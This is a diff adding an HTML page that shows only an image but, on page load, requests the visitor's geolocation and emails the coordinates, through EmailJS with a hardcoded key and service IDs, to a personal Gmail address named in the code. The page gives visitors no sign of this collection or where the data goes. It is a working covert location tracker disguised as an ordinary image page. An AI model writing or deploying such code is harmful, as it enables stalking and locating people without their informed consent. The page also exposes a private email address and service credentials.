@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Localização</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init("yzkcq0FwtO1kwMJj5"); // Substitua "YOUR_USER_ID" pela sua public key
+        })();
+    </script>
+</head>
+<body>
+    <img src="sua_imagem.jpg" alt="Imagem">
+
+    <script>
+        function enviarLocalizacao(latitude, longitude) {
+            console.log(`Enviando localização: Latitude: ${latitude}, Longitude: ${longitude}`);
+            
+            var serviceID = 'service_qeghfrr';
+            var templateID = 'template_u0bon38';
+
+            var params = {
+                to_email: 'felippeks@gmail.com', 
+                subject: 'Coordenadas de Localização',
+                message: `Latitude: ${latitude}, Longitude: ${longitude}`
+            };
+
+            emailjs.send(serviceID, templateID, params)
+            .then((response) => {
+                console.log('SUCESSO!', response.status, response.text);
+            }, (error) => {
+                console.error('FAILED...', error);
+            });
+        }
+
+        function obterLocalizacao() {
+            console.log('Obtendo localização...');
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        console.log(`Localização obtida: Latitude: ${latitude}, Longitude: ${longitude}`);
+                        enviarLocalizacao(latitude, longitude);
+                    },
+                    (error) => {
+                        console.error('Erro ao obter localização:', error);
+                    }
+                );
+            } else {
+                console.error('Geolocalização não é suportada pelo navegador.');
+            }
+        }
+
+        window.onload = obterLocalizacao;
+    </script>
+</body>
+</html>
